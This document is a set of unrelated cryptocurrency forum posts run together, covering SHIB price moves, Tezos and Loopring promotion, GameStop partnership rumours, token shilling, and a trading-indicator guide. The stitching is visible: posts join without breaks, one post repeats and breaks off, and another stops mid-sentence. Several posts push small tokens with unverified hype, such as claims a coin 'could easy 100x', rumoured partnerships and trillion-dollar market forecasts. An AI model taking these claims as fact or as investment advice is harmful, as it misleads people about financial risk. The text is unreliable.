Okay so maybe I was wrong about the absence of any more uninspiring moments. On October 11, SHIB more or less repeated its listing dance routine. It bounced around uneventfully between $0.000026 and $0.000029. Not terribly dramatic, but keep in mind that this more than a 3x increase if you bought during the post-listing slump. 

Then whatever they were feeding it on October 23 really worked. It cracked its post-listing peak and hasnt looked back. Of course, this has only about a week and a half. Will it last? I dont know. Does it have to? I would say no. If you're just in it to make a couple bucks,

Save for a few buy and sell day combinations, if you purchased SHIB within its first month on Coinbase, you could sell it at almost any time after that for a profit. At the most, you would currently be around 10X; at the least, just shy of 2X. Doubling an investment in a few weeks is in fact incredible. If you lost money on SHIB since it has been listed on Coinbase, you must have been trying to.


Unless you are investing millions of dollars, dont ever expect to make millions of dollars investing. If you bought SHIB a year ago, congratulations on the completely unexpected success. If you bought it a month ago, you probably didnt add a zero or two to your net worth, but congratulations nonetheless.

TLDR: just look at the chart.

Found this baby about 4 weeks ago and jumped in. The token has great utility and is still at an extremely low MC. Their website has a great Whitepaper and the utility is a tracking app that can be found here Quidity.Io. They produced a whitepaper with extremely attainable goals at QuidIka.com. The community on telegram is cohesive and positive. I cannot say enough good things about this token. Price is currently up around .06c which also makes it an extremely affordable token for all sizes and it is NOT ANOTHER MEME COIN WITH NO UTILITY. First centralized exchange listing is on LBANK this Thursday with a few more to follow. [Tokens Utility](quidity.io)[Tokens website](quidika.com)

This is not financial advice and do your own research. Just offering my opinion on a token I recently jumped in thats done really well for me so far.

Saying Tezos has exploded this year would be an understatement. Network usage has risen drastically thanks to a booming NFT culture and growing defi projects and eco-system. Smart contract calls are through the roof closing at almost 6 million for the month of September. Compared to the September from the year before is an increase of almost 4400%! 

Some reasons to look into Tezos:


-Tezos is decentralized. 

- LPOS lets you delegate your XTZ directly from your wallet, letting you be in FULL control of your coins. Simply delegate your XTZ to a baker who supports the proposals you support. 

- Tezos has fully functional on-chain governance, allowing it to adaptas needed, without the use of hard forks. 7 upgrades implemented so far which is a huge feat, and an 8th upgrade (hangzhou) around the corner. 

- There is also plan afterwards to implement "Tenderbake" which will bring deterministic finality (1000tps), planned for the beginning of 2022. 

- Fees are dirt cheap, from my experience usually around 0.002 XTZ (Pennies) for general defi purposes, with heavy focus on scaling Tezos as a modular blockchain from the Tezos foundation and other network contributors. 

- Tezos has no issues with sustainability as it uses Proof of Stake. The energy it takes to mint an NFT is less than what it takes to send a tweet on twitter. Tezos loves to brand as a green blockchain. 

- Speaking of which, NFT's are huge on Tezos right now with Dapps like OBJKT, Kalamint, and especially HEN (hic et nunc) having seen amazing growth in users. HEN was released in february of this year and is already competing for top 5 NFT marketplace by active users, with OBJKT working its way to top 10. Tezos has arguably the BEST art in crypto.

- If you are a fan of Ethereum like myself you can WRAP your ERC-20 tokens onto the Tezos blockchain (WBTC, WETH, WLINK, WAAVE, etc), Which you can also use in defi to earn high APY on your assets.  

- Speaking of Defi If you are into yield farming Tezos has some great opportunities, Plenty is a good option it has recently been listed on both Coingecko and CMM. If youre interested APR's have ranged from 120%-300% for a while now. (Understand the risks associated with Defi and Yield Farming before trying it out)

-- Tezos has great partnerships with big European banks, F1 racing, Redbull, Ubisoft, Real estate firms, etc. Just yesterday "OneOf" a Tezos NFT platform trying to mainstream NFTs, made a multi-year deal with the grammy awards to be their official NFT partner. Its truly crazy how many Institutions, businesses and people are adopting Tezos, at only a $6b market cap!! 

- The community is very friendly and helpful to newcomers while also determined to create a well rounded ecosystem. Gotta give the ogs props for sticking thru with Tezos as it hasnt exploded like almost every other L1 being hyped up right now. 

XTZ has a very bright future ahead of it. Decentralization and its on-chain, secure and fast upgrades will keep it ahead of the pack for the foreseeable future. 

Thanks for reading and Im sure I can speak for most of the Tezos community when I say we'd love to have you on-board!

Just thinking of a decent way to get people interested and involved.

Crypto gift cards might be a good way.  toss 10 20 50 100 on one and see if they start paying attention to the value.  The problem I foresee is the complaints about :

a) not being able to spend it anywhere

b) the fees to get it out (gas)  reminds me of atm fees when youre out of network, on crack.

&amp;#x200B;

maybe a hardware wallet (on the expensive side) would be a better option paired with sack of washers nuts hex wrench and stamp set.

&amp;#x200B;

Anyone have experience with this?

I was just thinking about this the other day after I ended buying the top of a Crypto just to see it dump 50% and sold then within hours it pumped again to new ATHs... my uncanny ability to consistently time the top and consistently time the bottom is truly a remarkable skill (Who says you cant time the market?)

Like think about how much intelligence and precision you need to accurately place your buy order right in at the very top such that the price stagnates then dips. 

Then in the same swing of luck place a sell order at the weekly low, just to see it pump up again and go on to new ATHs. 

No human should have this much power to be able to turn thousands into hundreds of dollars.

Does anybody else here possess such a skill?

I understand it is another Layer 2 solution for ETH gas fees.

It is very centralized (and its solution is off-chain) but somehow people are ok with this.

It offers a fee-less solution after an initial setting up cost of a few hundred dollars - which the rich won't mind apparently.

There are rumors for Gamestop partnership. When is this expected to be officially announced?

The other couple of posts on Loopring were clogged with thousands of comments and I couldn't read everything on there. If we can make this post about summarizing the hot points, it'd be appreciated.

I'm not bashing this coin, I'm here to get answers.

I already have some money invested in BTC, ETH and some other boomer coins (Although, I am not a boomer lol). Now I wanna invest in some of the other coins as well. 

Here is what I have scoped down after a couple days of research. Didnt go too deep in the tech but scrolled the website and white papers of these coins. Also followed discussions about these coins in a few groups. Please let me know if you think this will make a good portfolio or not:

DOT
LINK
ALGO
ATOM
AMP
MANA
LRC

Wanted to add VET to it as well but thats not available on Coinbase and I dont want to go to another exchange to buy it.

Didn't include MATIC, LUNA and SOL as they are already up more than 100 times in the last 1year. Still fighting myself if this should prevent me from buying these or not. 

Also, any advice on some other good coins is also welcome.

I got into crypto around April this year, but have recently gotten back into, and have been engaging with this sub.

You all seem like a friendly people who wanna help others to learn, and thats exactly why Im here. I know people like to say DOYR, but to be honest I have a slight LD and it can make things like that difficult. 

Any advice, support or anything you guys wanna contribute would be amazing, Im re-learning how to use Reddit so apologies if Ive broken any etiquette or have made a pointless post

These are probably the same people who downvote everything they see because "MoOnS". I miss the memes. The memes were funny. Bring memes back. This place is soulless, boring, and a miserable echo chamber of noobies parroting one another. At least let us get some fucking laughs in between :\[.

There are a thousand ways you could have nerfed karma for memes instead of banning them outright. Everything shouldn't be dictated by voting with moons, as a few whales hold all the power. They always try to veil it as a democracy, but in a democracy everybody only gets one vote, people don't get a number of votes weighted on how rich they are.

I'm sure a lot of people would be happy to see memes back. This place is just, blegh.

I hate to be the bearer of bad news but this cycle is most likely much closer to its end than its beginning.  

In crypto, what most people expect to happen often doesuntil it doesnt.  Right now, everyone expects ETH and BTC to lead a chart topping rally to wild new heights.  I mostly believe that too.  However, the higher we go, the riskier it gets.  Most analysts expect this bull run to continue until the end of the year or start of next year.  There is always a crash at the end of the cycle and now people expect it more than ever and will play their hand accordingly.

Idk how high we will go before the crash but even BTC fell over 80% last cycle and this cycle will likely be almost as bad.  

My suggestion is to watch carefully and take profits towards, especially on alts.  Youll need those profits to buy the dip.

I wrote the last two posts on Loop ring, which seemed to help and educate a lot of people on their potential partnership with some large companies.

I wanted to talk about why Loop ring and NFTs are being linked to GameStop.

**What is GameStop?**

If you dont follow the news or anything financial, GameStop is a company which sells video games, consumer electronics, and gaming merchandise retailer.

For a while, GameStop and its shares have had (and continues) to have a lot of selling pressure by large companies who want to see it crash by shortening the stock. However, many of its loyal customer base and shareholders have prevented this, and have turned the hooks on any company which has shorted it. It has defied anyone who has gone against it, and is continuing to grow.

It has also made a lot of people a lot of money who hold the shares. It has a true following which is loyal and unlike any other company around, and people are willing to keep buying it to watch it succeed. This is what we call a golden supporter base. Apple has it with its products. Samsung with theres. GameStop has the same thing.

**Why is GameStop getting into NFTs?**

A NFT is a single asset usually embedded in an object (like a video game skin, for example) and registered in a blockchain network. It is an encrypted digital record of a piece of art that can be bought, sold, and collected. NFTs, meanwhile, have been on their own popularity surge as everyone from traditional auction houses to billionaires began selling the unique digital collectibles.

GameStop announced they would enter the NTF arena, to a great uproar from customers and shareholders. This was further enhanced by them launching a NFT website: htps://nft.gamestop.com/

Gamestop will be launching its platform on the Ethereum marketplace. Gamestop could offer In Game NFT purchases, could sell and redistribute exclusive content from video game producers, could allow users to mint NFTs and resell them in a gaming focussed marketplace, and reward users with exclusive NFTs, just to name a few opportunities it has.

**The NFT marketplace is expected to reach 1-2 trillion dollars in sales in the next few years.**

With Gamestop at the heart of the gaming industry, it has the ability to capture a large part of the gaming market with its NFTs. With large gaming companies, and large movie producers looking for a industry leading platform to sell their NFTs, Gamestop would be the perfect place for them to get exposure, whilst increasing their revenue through there NFT marketplace.

**So Why are GME Holders So Excited and Buying Up Loop ring?**

The Head of GameStops Blockchain is Matthew Finestone. The reason why many are getting excited is that he was Head of Business for Loop ring before moving to Gamestop. He was responsible for bringing business to Loop ring, whilst onboarding other companies onto the Loop ring system.

One can assume that if Gamestop needs a reliable, secure, and fast platform, then they would ask their Head of Blockchain where to go. In this case, it could potentially be Loop ring. After all, Matthew Finestone did work for the company. He would potentially know everything he needs to know about the Loop ring platform, and could integrate both companies together quite easily.

Furthermore, Gamestop is building a team of engineers, designers, gamers, and marketers to really create a NFT platform which is next generational, and the best in the industry.

This along with Ryan Cohen who is known for launching and turning around businesses to make them reach new levels, meaning that backing Loop ring and Gamestop on a potential partnership could be rewarding for holders.

**So, What Does This Mean for Loop ring?**

Loop ring (before any rumours of GME came out) have stated they are going to be launching a free wallet (maybe this wallet can be provided to all users of the potential GME platform).

They also stated that a big announcement is coming in Q4 which would be worth 10 times more than any announcement/quarterly report they would announce. This along with rumours that are working with an established partner who is building atop our newly released L2 NFT functionality, is why GME and Loop ring holders are pretty excited to see what happens.

**I hope it helps to why people keep linking GME and Loop ring together. If this partnership is real, then you are linking a viral powerhouse with GME (whos holders actually give a damm about the company passionately), and Loop ring (who has a game changing NFT platform to scale any company), which can cause an immediate impact to the global NFT marketplace.**

Yo Guys, i was browsing on the Coinbase and noticed that Loopring is offering 1.5 Dollars is you awnser their questions correctly. I think that someone already mentioned it a few days ago but I was on the waiting list and some of you also couldnt do it, so I'm leaving this reminder for those who didn't get it. I know 1.5 Dollars isn't much but it can become much more.

Il leave here the three awnsers for the three lessons of the quiz :

1 - An Ethereum scalling Protocol
2 - Requires a traditional bank account
3 - Looprings Governance tool

Ill pay attention to next ones and post it when i can do the earn

Look, i get it, the GME/LRC partnership is HUGE and it obviously deserves coverage- But my boy ETH just made a new ATH and it looks like people don't care!

Like guys: we're talking about ETH here, the 2nd biggest and objectively the sexiest coin in the market. If we don't talk about it doing ATH's than what Coin we'll we even talk about?

Anyway, I ***really*** want to thank all the HODLers that didn't panicked for months, bought the dip, and stay hydrated while doin all of these! You guys are the best!...

Stay safe!  (*And hydrated!*)

Hello to all.

I want to stake my ETH on Binance. I have read that you get a BETH token in replacement. But how does it work? Does it mean I can basically stake ETH and still have these BETH tokens that I can technically sell?

What about capital gains? If I start staking this ETH and I have already made profit for holding it, will staking (and the switch to BETH) make this taxable aka capital gains tax?

Can someone who has done this explain in simple words as well as what is the best way to do it?

I see a lot of people in this sub complaining about making stupid investments, or constantly being in the red, well look no further. Youre probably thinking you should start with some BTC/ETH right? Wrong, who wants healthy steady gains when we can be millionaires.

If you manage to follow this simple 3 step process, youll be a crypto millionaire swimming in lambos and boating accidents in no time.

Step 1: Take your $10, and invest in the next moon coin. Now I know there are thousands of them, but they are super easy to find. If its got a picture of a dog, it will moon. Its got SAFE in the name, surely this has to moon? Seen it shilled in this sub along with , guaranteed to make you rich. Now you have to make sure you dont pull out at x5, x10 or even x50.. hang in there till it hits 10000% gains, and then sell.

Step 2 is basically a repeat of step 1 but with $1,000, trust me doing this twice in a row is easy.

Step 3: possibly the easiest step of them, this time your shitcoin only needs to x10 to make your a millionaire.

As always, this is not financial advice. I sincerely hope when you ready this out loud, youll see how simple it is /s

TL;DR - shitcoin investment is super easy and you can definitely become a millionaire. not

You can also read the following article on [Publish0x](https://www.publish0x.com/crypto-gateway/the-loopring-protocol-what-s-the-hype-about-xjoxdkr).

# [What is this Protocol about?](https://loopring.org/resources/en_whitepaper.pdf)

According to the official website, *this protocol is an open-source zkRollup protocol.*

Lets unpack it. First, lets understand Zero-Knowledge proofs. In a nutshell, a zero-knowledge proof is a method by which one party (the prover) can prove to another party (the verifier) that a given statement is true, without conveying any information apart from the fact that the statement is indeed true. This sounds paradoxical and even impossible, but with some clever mathematics, its very much possible, and its the working principle behind tokens like MINA protocol and Z-Cash. For example, a zero-knowledge proof might enable a government agency to verify that you are above the age required to access a website, without revealing your exact birthdate.

Heres an article by [CoinBureau](https://www.coinbureau.com/education/zero-knowledge-proofs-zksnarks/) explaining it in detail.

So what does this Protocol do? It allows the creation of decentralized exchanges. It provides a set of smart contracts and zk circuits to provide an open standard, on top of which you can build any Crypto DeX or even a payment app. In some way, it's like a blueprint to make a decentralized exchange like PancakeSwap or ShushiSwap. So how is it better than the existing solutions? Well since it uses ZK proofs, it makes it highly secure and highly scalable. Remember, in ZK proof one party can prove a contract has been carried out, without even releasing the details about it. That's the reason it's so secure and anonymous, and that's exactly why ZK proofs are used by ZCash too.

# Tokenomics

* ERC-20 Compliant: YES
* Total Supply-Fixed:  **1,375,076,040**
* Token Address: 0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD
* Proof-of-Stake
* [More Details about its Tokenomics](https://medium.com/loopring-protocol/lrc-tokenomics-v2-1e6fd99e9e9c)

# Transaction Speeds and Scalability

This well-established protocol also aims to solve a **MAJOR** problem with [this DeFi ecosystem](https://ethereum.org/en/): Gas fees &amp; scalability. This new layer-2 protocol has extremely high throughput, that's because the payments and the transactions are processed in batches "off the main chain", so they are lightning-fast (pun intended), all while maintaining high levels of security. As a result of all this, there are near-zero gas fees for trading any crypto or adding liquidity. Also, this protocol has a fairly high throughput of **2025 TPS**.

# Summary

So, all-in-all, this protocol seems to be a promising crypto project, which can potentially create a much-needed integration between the decentralized exchanges, significantly increase the retail money &amp; participation in DeFi projects by nearly eliminating gas fees, and decreasing transaction times. With a relatively low market cap and a potential partnership with GME, this project seem to have solid fundamentals to grow both in the short &amp; long term. That being said, it might face competition from other projects and ecosystems in the DeFi space, and even other L2 solutions that scale-up [this DeFi ecosystem.](https://ethereum.org/en/) So will this project become the de-facto DeX protocol? Only time will tell.

Assuming BTC keeps its bullish momentum going, what alt coin do you feel is yet to make massive gains for when we're fully in alt season? Most importantly, WHY? What's in the works with said crypto? What's coming up on its roadmap? What are the fundamentals and use cases of your suspected crypto?


No shilling, pls. Just curious to know which other cryptos are lagging behind like ADA currently is. Especially those that still have potential, cause it's arguable that ADA won't make much moves again till hydra is done and smart contracts are up and running and BEING USED.

Hi,

I did a dumb mistake, I had SHIB INU (0xf09a100c32d780f0a48754e43533f9fb374e85f9), not the right token. I sent with this token address to my Binance address to the right SHIB INU token, and I havent received the transaction. Later I realised the stupid mistake I did. The transaction was successful, but not into my account. So the funds are some where but not in my Binance account because they don't have that specific SHIBA token listed on the chain. I have my Transaction Details BuyExchangeEarnGaming. I swapped DEC to SHIBA INU on pancake swap, wrong mistake ever-done since now. -.- Really pissed with myself. Any way of recovering my funds?

In recent days, I have realised how fear can excessively dissuade us from making a profitable investment and lure us into a trap set by scammers that are lurking in a dark shadow waiting for their prey. 

I participated in a whitelisting contest of two tokens that would have turned out profitable had I invested my money. But fear of being scammed, of falling in the scammers' den prevented me from taking the opportunity. Both the tokens have had more than 10x in less than a week. And I'm here boooom!!! 

However, I  suffered a huge loss yesterday when I invested in a token without much research. I therefore developed a cult-like habit now by taking an oath that I would never let go of an opportunity whenever it presents itself to me. 

Thus I will follow this simple rule:
Research as thoroughly as possible and invest when a token meets your trading criteria. Be responsible of your decision!

I know this sub looks down upon meme coins from their high horse as they continually shill the same coins over and over (algo, ada, vet), but I do think everyone in this sub has a common goal of getting filthy rich. For that reason I present the ultimate meme coin: Banano. This coin not only has a wholesome community akin to the early days of doge, but it also has a stupid low market cap. Sitting at 50 mill rn, its got nowhere to go but up. Memes aside, this is actually a great utility coin. Being a fork of nano, it maintains the same fee-less and instant transaction benefits. It also has a very cool feature where you can tip with it on Reddit by using the banano tip bot. This is a memecoin that has real world use and could easy 100x. This is coming from a guy who stays away from most memecoins. Yall can shill algo in the comments now ;)

So I've been doing this project for 2 months now (I'm a beginner), its a simple blockchain and cryptocurrency named Pinote, it has support for tokens it uses a very simple POW mining algorithm, it's not much, but it helped me a lot understanding things behind bitcoin; at least more than the white paper helped me, it helped me understand how wallets work, it helped me to understand how new bitcoins are being added to circulation and was fun, it was my biggest project ever and it has some huge problems so it is not completely practical to be used as a cryptocurrency,

there is a link to the project: [github.com/Abtin-Shahpoori/Pinote](https://github.com/Abtin-Shahpoori/Pinote)

II wrote it in js, and I made it using this as a source: [github.com/15Dkatz/cryptochain](https://github.com/15Dkatz/cryptochain)

I kinda copied the code

anyways I hope this has been helpful and has inspired you to make your cryptocurrency, if you did send the GitHub link for me, I'll be really happy to see them

I wrote the last two posts on Loopring, which seemed to help and educate a lot of people on their potential partnership with some large companies.

I wanted to talk about why Loopring and NFTs are being linked to GameStop.

**What is GameStop?**

If you dont follow the news or anything financial, GameStop is a company which sells video games, consumer electronics, and gaming merchandise retailer. 

For a while, GameStop and its shares have had (and continues) to have a lot of selling pressure by large companies who want to see it crash by shortening the stock. However, many of its loyal customer base and shareholders have prevented this, and have turned the hooks on any company which has shorted it. It has defied anyone who has gone against it, and is continuing to grow. 

It has also made a lot of people a lot of money who hold the shares. It has a true following which is loyal and unlike any other company around, and people are willing to keep buying it to watch it succeed. This is what we call a golden supporter base. Apple has it with its products. Samsung with theres. GameStop has the same thing.

**Why is GameStop getting into NFTs?**

A NFT is a single asset usually embedded in an object (like a video game skin, for example) and registered in a blockchain network. It is an encrypted digital record of a piece of art that can be bought, sold, and collected. NFTs, meanwhile, have been on their own popularity surge as everyone from traditional auction houses to billionaires began selling the unique digital collectibles.

I have been involved in crypto market for around 6 months.My profits are not very large since I failed to sell my assets before a bear market or a strong pullback and then buying the dip. So what is the main factor which influences this market? Is it the traders and investors buying or selling according to their chart analysis? Or is it heavily influenced by whales and market news?

Anyway, I would also love to know your methods of predicting the crypto market. Whether your using chart analysis, actively reading news on twitter or something or maybe some other method.

I invest my life savings into ELON, it was supposed to be the next big thing.

I was promised millions of dollars in profit, women throwing themselves at me, men wanting to be me.

I was going to post on here and have everybody tip me with moons, celebrating the great news of another crypto millionaire.

But instead I am sitting here, eating a Whopper trying to gain back what took me years to save.

Today I learned DYOR is not just four random letters that elitist comment on every post, that youtube crypto experts only wanted my views, that the guy who said Dogelon will be the next SHIB was a true piece of shit.

The only good that will come from this is that other may learn from my mistakes, do not invest in every shit coin you see. DYOR indeed!

I will never again see the $50 dollars I put into ELON.

According to the Brave Roadmap 2.0, they are researching and working on a scaling solution for the Brave Ad Network.

Today the ads and rewards are counted and processed in the browser itself. A very centralized solution and the users are forced to trust that their reward balance is correctly calculated and stored in the browser.

Brave is now looking into a solution to move this process to a decentralized state, introduction THEMIS V2!

With THEMIS V2 users can verify their balance in a private way that is not linkable to a user. This solution will never reveal which the ad the user saw and/or interacted with!
They are currently looking into other L2 and L1 Blockchains in the ETH ecosystem.

This will bring the whole project a big leap forward!

Changing facebook name to Meta!

Basically this Meta word is actually a name for Meta verse which could be a virtual and artificial world and its a generated artificial type of a system where you could have your own character animated shape and a virtual world. 

They are releasing the Beta version of Meta where you would be using Non fungible tokens NFTs(digital assets used for making different characters and you could purchase it through cryptos). As the NFTs are degital assets and so the currency would be degital only which would be surely the cryptos to purchase those NFTs. 

So the cryptos are automatically empowering Meta verse world and there would be days you would be working and earning digital currency only including job wage, buy and sale dealing with cryptos. 

Digital world would be ruling one day surly.

The community is adding Reddit community points. This gives us insight into the way Reddit plans to implement points in each subreddit. Prior to this, most people hoped moons would go Reddit-wide, but clearly each subreddit will be getting their own token. 


Whats interesting is the clear hate for the idea in the comment section. I was surprised to see so many dislike the idea (and even people from this subreddit joining in), and I was also surprised at the lack of traction the post got. Perhaps with community points implemented more people will come around to the idea as they earn for their karma. 


If the idea doesnt work out, its possible the Reddit-wide moon implementation could make more sense with already established rules and user base. But thats just hopium for moons.

I hope I can help you with this Guide to analyse the market more accurate. It was a lot of work to write this post so i hope it will help you.   


**Cipher A**

https://preview.redd.it/j8ui8oidc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=422832b4890fcfd1f536125f19969bc86fd0cb70

**Cipher A**is comprised of 8 different EMA ribbons. These ribbons change color based on the trend of the market. Cipher A also has multiple symbols that populate on the candle stick chart to give a visual cue of what could happen in the market.

* **EMA Ribbon:**8 different EMA values, editable to your choosing. In its default settings, the ribbon color shows what trend we are in.- **Blue or White**= bullish- **Grey**= bearish
* **Yellow/Green Diamond:**bullish continuation
* **Red Diamond:**trend weakening.
* **Green Circle:**bullish indicator, if followed by a yellow/green diamond, a breakout is possible.
* **Red X**: Bearish indicator, if followed by a red diamond, a breakdown is possible.
* **Blue Triangle**: Trend reversal indicator, momentum is decreasing, and a reversal is near
* **Blood Diamond (large red diamond)**: Bearish indicator, if paired or followed with a red x or smaller diamond, a break downward is likely.

**Cipher A**looks great visually, however**Cipher B**is where you really make most of your trades from.

**The two best parts from Cipher A:**

1. **Blue triangles to prepare for a reversal**. If you see this, make sure you have your stop losses set.
2. **EMA ribbon**to help detect trends.- **Hint:**disabling all ribbons except 4, 5, and 6, still allows us to see the trend without the chart being too busy.

&amp;#x200B;

**Cipher B**

https://preview.redd.it/npoom8iec8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=659a4895fc450c2519db08cc4b6e3068d36b5c33

**Cipher B**is a combination of multiple oscillators in one. There are multiple waves to pay attention to.

At first look, this can look very chaotic and confusing, but lets break things down one by one.

* **Blue waves:**Momentum wave.- Commonly used as a primary indicator
* **Red and green dots (on waves)**: wave/RSI crosses.- **Red**= price is currently moving lower.- **Green**= price is currently moving higher- Used as entry and exit points.
* **Green and red lines on waves:**hidden divergences- Assist with the blue wave trading strategy.
* **Floating Dots above/below blue waves- Green**= local**bottom**, look for additional buy indications- **Red**= local**top**, look for additional short indications
* **Yellow Waves:**Volume Weighted Average Price (VWAP)- Commonly used as a primary indicator, especially on shorter time frames
* **Green and red waves:**Money flow indicator (Green Money flowing in, red money flowing out)- Can be used as a standalone indicator, can be used with VWAP.
* **Blue/Purple line:**Stoch RSI- Not necessary and can be disabled. We will discuss this in this guide, but we do not personally use them for the main strategies.- When the**Stoch RSI is low**, and crosses to go up (turn blue), you buy.- When the**Stoch RSI is high**and crosses to go lower (turn purple), you sell. Simple and can work as its own strategy.

**Please Note:**Some of the triggers above are based on lagging indicators such as RSI divergences. That means some of these dots and triggers will not display live but rather 2 intervals back. This does not mean that its repainting, its simply because certain indicators are lagging indicators. Action can still be taken on lagging indicators. It should not impact the**main**strategies outlined below.

&amp;#x200B;

**Blue Momentum Waves**

https://preview.redd.it/4lvrrzcfc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=44b26d9a9ce2b4c7a570e09b72e86bafe0eb74ed

For this indicator, you are looking for three waves in total:

* Wave**One**and**Two**on the same side of the Zero line.
* **The Gap**between the two waves on the other side of the Zero line.

1. Waves**below the Zero**line indicate a**long.**
2. Waves**above the Zero**line indicate a**short.**

You can see how this indicator works in the three trades above.

**Rules for this strategy:**

The**first wave**must be**bigger than the second wave (the wave that follows the gap)**to enter a position.

This is not always true, and sometimes you could take a position without all three waves, but it isnt the safest method. Example would be Wave 1 in Yellow circled above. The far-left part of the blue wave could have been your first indication, and then the green dot circled could have been your entry position for a long. This works in some instances, but not all. That is why we typically look for a gap.

&amp;#x200B;

**Example Trades from above**

**Trade 1**

We took a long on trade 1, denoted by the yellow on the chart above. The reason for this trade are as follows:

1. **Wave 1**Large blue wave below the zero line.
2. **The Gap**A blue wave above the zero line on the other side.
3. **Wave 2**Blue wave on the same side of the zero line as the first wave.

**Entry Position:**You are looking for the white part of the wave, to cross the blue part of the wave**(indicated by the green dot)**.

**Stop Loss:**This should be the**support just prior to this move**.

**Exit**: You should be looking at the next wave above the zero line, when the white crosses the blue on the wave (**indicated by the red dot)**.

**Note:**This trade could have been skipped due to the head and shoulders present. In these situations, use your own due diligence and experiences to decide whether to enter the trade.

**Trade 2**

We took a short on trade 2, denoted by the red on the chart above. The reason for this trade are as follows:

1. **Wave 1**Large blue wave above the zero line
2. **The Gap**A blue wave gap below the zero line
3. **Wave 2**Blue wave on the same side of the zero line as the first wave.

**Entry Position:**When the white crosses the blue on the wave (indicated by a red dot).

**Exit:**You should be looking at the next wave below the zero line, when the white crosses the blue on the wave (**indicated by the green dot)**.

**Trade 3**

The same exact concept applies to this as Trade 1. In this trade, the gap for Trade 3 was also involved as Wave 2 in Trade 2. Depending how active you are trading, you could use waves back to back if they meet the trade criteria

&amp;#x200B;

**Red and Green Floating Dots**

https://preview.redd.it/2dsy82jgc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=d4fa0baa5dd19e0dba45e0fad5ff26050610dc39

* The**Floating Red Dots above the zero line**denotes when a local top is created.
* The**Floating Green Dots below the zero line**denotes when local bottoms are created.

In these situations, you want to start looking for another indication to enter the market.

&amp;#x200B;

**Volume Weighted Average Price (VWAP)**

https://preview.redd.it/jq0jxyqhc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=b965e97037227d5f3211326ccee2b9297e21e4e9

The VWAP indicator has been most successful on shorter time frame trades when youre able to spend a decent amount of time day trading.

Switch the VWAP indicator from waves to columns for a better visual of which direction it is going, and when it breaks the zero line. This is illustrated below in the following trade examples of how you can utilize VWAP. As you can see, there are a lot of trades taken and that is why it can require a bit of your time.

https://preview.redd.it/mow1lw4mc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=341f56c1c8623f3b79c5ccedea8cf4073ecab4ad

This backtest illustrated above is based on day trading on the 5-minute chart consistently.

Red vertical dotted lines indicate it was a short entry, green a long entry.

Other indicators used in conjunction with the VWAP:

1. Cipher As EMA ribbons
2. Cipher Bs Money Flow Indicator

In this test, the risk/reward was 1:1 with a 1% take profit and stoploss.

**Rules:**

1. Only enter a**short**when

* themoney flowindicator isred.
* TheVWAP is confirmed(2 candles)below the zero line.
* TheEMAribbon isgrey (bearish).

1. Only enter a**long**when

* Themoney flowindicator isgreen.
* TheVWAP is confirmed(2 candles)above the zero line.
* TheEMAribbon isblue/white.

**Results - 14 trades**

* 12 trades were successful with the 1% profit.
* 2 trades were unsuccessful and were stopped out at 1% losses.

Here is a little closer view of some of the trades.

https://preview.redd.it/sa818o9nc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=4dcc985fc3da107d98e453ade7c0b9e1d7cadab1

&amp;#x200B;

**Money Flow Indicator**

https://preview.redd.it/heuswo0oc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=d4968dac1ba5f96e4886ed99ed829c837d4430fe

This indicator is useful on any timeframe, and simply measures the amount of money being transacted.

* **Green**= money flowing in.
* **Red**= money flowing out.

As seen in the above and below images (4hr and 15 min charts) this indicator can be used by itself.

* **Long**when you have a candle or two confirming that the money flow is green and getting stronger.
* **Short**when you have a candle or two confirming the money flow is red and getting stronger.

&amp;#x200B;

**Stochastic RSI**

https://preview.redd.it/bo5ss8woc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=4d096bf3974a7708c871afda84daa5ea5d692442

This indicator is useful in that you can simply buy with the Stoch RSI crosses.

* **Long (or close short):**When the Stoch RSI is low, crosses to go up, and turns blue.
* **Short (or close long):**When the Stoch RSI is high and crosses to go down, and turns purple.

This can be seen above on the 4hr chart.

&amp;#x200B;

**Cipher DBSI**

**Cipher DBSI (Dual band Strength Index)**measures momentum and displays whether the bulls, or the bears are winning the market battle. By default, the indicator settings populates with**columns**. Switching the settings from columns to**Area**can help you visualize the changes and strength a little better.

Other symbols to pay attention to are the red and blue circles.

* **Red**means possible**sell**signal
* **Blue**a possible**buy**signal.
* **Orange X**indicate there is a market battle between the bulls and the bears. With the markets lately, this seems to be a regular indicator so I typically would hide this to reduce the noise on the screen.

The rule for this is indicator:

* **Only long**when a blue dot has printed after the blue bullish momentum waves have been confirmed (12 candles)
* **Only short**when a red dot has printed after red bearish momentum waves have been confirmed.

In the screen shot below, you will find the 4hr chart from when we started our down trend.

https://preview.redd.it/ff881qyuc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=82db0a421075eefdc5ee0aa36d884a06d2b98f8b

If you see the**first dotted vertical line**you see that the bulls lost their momentum, as the blue wave has now**turned red**, the candles**are red**, and a**red possible sell circle**has printed.

If you did not sell at that point, then let us look at the next set of dotted vertical lines.

Briefly, the bulls took control again, but quickly the momentum swung back in the bears favor. Multiple red 4hr candles, and then a red sell circle.

The candle after the signals candle closed was met with an 11% drop. If you continued to hold through that, you will see the same signals on the third set of vertical dashed lines, with more downside to follow.

Now let us look at the recent price moment and some trades that could have been made using DBSI.

https://preview.redd.it/hjphoxpvc8x71.png?width=1920&amp;format=png&amp;auto=webp&amp;s=7179735382dad9ae00e7811ec7ec3c5ed16b9d3b

* **For Stops** we can afford to lose 2.5% or prior support, whichever is less.
* **For Take Profit**5% target point.

As you can see here, there are 4 trades with just using this indicator following the rules above. The**first two**trades were**wins**, the**third a loss**, and the**fourth trade**we would still be in at the time of writing this.

**Summary**

In combination the indicators are very powerful a good tool to make profitable trades. Some of them are a bit more complicated but when you learn and use them you can make good trades.

This is no financial advice

Hi guys,

What do you think of Elongate? 

Its a project that exists since March. They aim to be the bridge between Crypto and Charity. They have also donated almost 4 million toward Ending world hunger, cleaning the oceans, cure EB research, Kimbal Musks charity Big greem, India for helping out with Covid and many more.

Recently they have announced a whole ecosystem which includes a partnership with Salesforce to incorporate crypto in its users transactions where all of it would go through Elongate and raise money for charities. The app is being set up and will be ready in a few weeks.

